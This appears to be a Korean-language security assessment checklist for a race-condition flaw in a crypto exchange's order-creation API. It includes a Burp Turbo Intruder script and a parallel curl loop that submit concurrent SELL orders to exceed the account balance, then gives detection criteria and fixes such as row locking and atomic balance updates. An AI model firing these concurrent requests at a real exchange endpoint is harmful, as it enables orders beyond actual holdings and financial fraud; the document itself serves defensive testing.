================================================================================
[VCE-ORDERS-02] 주문 Race Condition → 잔고 초과 주문 생성
도메인: orders (주문/거래내역)
================================================================================

## 1. 진단 항목 개요

- **항목명**: 주문 생성 Race Condition (잔고 초과 주문)
- **번호**: ORDERS-02
- **위험도**: Critical
- **OWASP**: Business Logic / Concurrency

## 2. 대상 기능 & 엔드포인트

| 항목 | 내용 |
|------|------|
| 로컬 | http://localhost:8080/api/orders |
| 운영 | https://vceapp.com/api/orders |
| HTTP 메서드 | POST |
| 인증 요건 | Bearer JWT 필요 |

## 3. 취약점 원리 (Why this works)

주문 생성 시 "잔고 확인 → 주문 생성 → 잔고 차감" 순서로 처리된다.
이 과정이 원자적이지 않으면:

```
T1: 잔고 조회 → BTC 0.01 확인
T2: 잔고 조회 → BTC 0.01 확인 (T1이 아직 차감 전)
T1: BTC 0.01 매도 주문 생성 성공
T2: BTC 0.01 매도 주문 생성 성공 (이미 T1이 생성했음에도)
결과: BTC 0.01로 0.02 매도 주문 → 잔고보다 2배 주문 생성
```

## 4. 테스트 절차 (Step-by-step)

### [사전 준비]
1. test@vce.com 로그인 → JWT 획득
2. BTC 잔고 소량 확보 (0.001 BTC)

---

### Step 1. 정상 주문 생성 확인

```
POST /api/orders HTTP/1.1
Host: localhost:8080
Authorization: Bearer <JWT>
Content-Type: application/json

{
  "assetType": "BTC",
  "orderType": "SELL",
  "price": 90000000,
  "amount": 0.001
}
```

---

### Step 2. Burp Turbo Intruder — 동시 주문 생성

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=1,
                           pipeline=False)
    for i in range(20):
        engine.queue(target.req, None)

def handleResponse(req, interesting):
    table.add(req)
```

---

### Step 3. curl 병렬 주문 (잔고: 0.001 BTC, 주문 각 0.001 BTC × 10개)

```bash
JWT="<your_jwt>"

for i in $(seq 1 10); do
  curl -s -X POST http://localhost:8080/api/orders \
    -H "Authorization: Bearer $JWT" \
    -H "Content-Type: application/json" \
    -d '{
      "assetType": "BTC",
      "orderType": "SELL",
      "price": 90000000,
      "amount": 0.001
    }' &
done
wait

# 생성된 주문 목록 확인
curl -s http://localhost:8080/api/orders/open \
  -H "Authorization: Bearer $JWT"
```

---

### Step 4. 미체결 주문 목록 확인

```
GET /api/orders/open HTTP/1.1
Host: localhost:8080
Authorization: Bearer <JWT>
```

정상: 1개 주문만 존재
취약: 2개 이상 주문 존재 (잔고보다 많은 수량)

## 5. 취약 여부 판단 기준

✅ **취약 (Vulnerable)**:
- 0.001 BTC 잔고로 0.001 BTC × 2개 이상 SELL 주문 생성 성공
- 미체결 주문 수량 합계 > 실제 잔고

✗ **안전 (Not Vulnerable)**:
- 동시 요청 중 1개만 성공, 나머지는 "잔고 부족" 반환
- 비관적 락으로 동시성 제어

## 6. 예상 취약 포인트 (코드 위치)

- `OrderService.java` — createOrder 메서드의 잔고 확인 → 주문 생성 비원자 처리
- `AssetRepository.java` — 잔고 조회/갱신에 락 없음

## 7. 권고 조치

- 비관적 락: 잔고 조회 시 `SELECT ... FOR UPDATE`
- 원자적 잔고 차감: `UPDATE assets SET balance = balance - ? WHERE balance >= ?`
- 주문 생성 트랜잭션 격리 수준: SERIALIZABLE 또는 REPEATABLE_READ
